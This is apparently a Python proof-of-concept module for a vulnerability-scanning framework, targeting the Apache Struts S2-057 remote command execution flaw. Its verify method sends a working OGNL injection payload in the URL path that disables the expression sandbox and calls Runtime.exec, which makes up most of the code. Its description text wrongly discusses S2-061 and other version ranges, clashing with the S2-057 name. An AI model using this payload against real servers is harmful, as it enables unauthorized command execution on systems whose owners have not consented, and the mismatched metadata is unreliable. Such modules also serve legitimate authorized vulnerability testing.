#!/usr/bin/env python3
# -*- coding:utf-8 -*-
from newpoc.cli import POC_QUEUE
from newpoc.api import (PocBase, Output, requests, quote, parse_urljoin)
from newpoc.utils.randim_str import generate_random_str


class POC(PocBase):
    cnvd_cve = 'S2-057'  # 漏洞编号
    version = '1'  # 默认为1
    author = 'myxae86'  # PoC 作者名字
    vulDate = '2020-12-08'  # 漏洞公开的时间
    createDate = '2022-11-29'  # 编写 PoC 的日期
    updateDate = '2022-11-29'  # PoC 更新的时间，默认和编写时间一样
    references = []  # 漏洞地址来源
    name = 'S2-057 远程命令执行'  # PoC 名称
    appPowerLink = 'https://struts.apache.org/'  # 漏洞厂商主页地址
    appName = 'Apache Struts'  # 漏洞应用名称
    appVersion = '2.3/2.3.34 & 2.5/2.5.16'  # 漏洞影响版本
    vulType = 'RCE'  # 漏洞类型
    desc = '''
        S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式是加强OGNL表达式沙盒，
        而S2-061绕过了该沙盒。该漏洞影响版本范围是Struts 2.0.0到Struts 2.5.25。
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = "pocs/Struts2/e-mobile-ognl.py"

    output = Output()

    def _verify(self, ip=None):
        result = POC.parse_output()
        url = ip['url']
        random_string = generate_random_str()
        ognl_payload = "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('echo " + random_string + "')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}"

        payload_path = "/struts2-showcase/" + quote(ognl_payload) + "/actionChain1.action"
        ip = parse_urljoin(url, payload_path)
        try:
            res = requests.get(ip)
            if res.text.find(random_string) != -1 and res.status_code == 200:
                self.output.success('S2-057:{} is vulnerable '.format(url))
                result['target-url'] = url
                result['payload'] = ''
                POC_QUEUE.put(result)
            else:
                self.output.fail('S2-057:{} is not vulnerable '.format(ip))
        except Exception as err:
            self.output.fail('S2-057:{0} is fail {1}'.format(ip, err))

    def _attack(self, payload=None):
        try:
            pass
        except:
            pass

    def _shell(self):
        pass

    @staticmethod
    def parse_output():
        result = {
            "target-url": '',
            "poc-name": POC.name,
            "poc-id": POC.cnvd_cve,
            "component": POC.vulType,
            "version": POC.appVersion,
            "status": 'ok',
            "payload": ''
        }
        return result


if __name__ == "__main__":
    c = POC()
    print(c.parse_detail())
